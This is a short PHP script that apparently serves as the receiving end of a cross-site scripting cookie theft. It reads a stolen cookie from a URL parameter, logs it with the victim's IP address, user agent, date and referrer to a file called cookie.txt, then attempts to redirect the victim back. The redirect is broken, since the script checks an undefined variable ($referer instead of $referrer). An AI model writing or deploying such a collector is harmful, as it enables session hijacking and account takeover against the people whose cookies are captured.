<?php
//set time zone and date format
date_default_timezone_set("Asia/Tehran");
$date=date("Y-m-d H:i:s");
$cookie=$_GET['txt'];
$ip=$_SERVER['REMOTE_ADDR'];
$agent=$_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'] ?? null;
//store data
$log="cookie = $cookie\n";
$log.="ip = $ip\n";
$log.="agent = $agent\n";
$log.="date = $date\n";
$log.="REFERRER = $referrer\n";
$log.="=======\n";
$f=fopen("cookie.txt","a");
fwrite($f,$log);

if ($referer !== null) {
    header('Location: ' . $referer);
    exit; // Make sure to exit after sending the header to prevent further execution
} else {
    // Handle case where HTTP referer is not set
    // For example, you could redirect to a default page or show an error message
    //echo "HTTP referer is not set. Redirect cannot be performed.";
    // Alternatively, you can redirect to a specific page like this:
    // header('Location: https://example.com/');
    exit;
}

?>
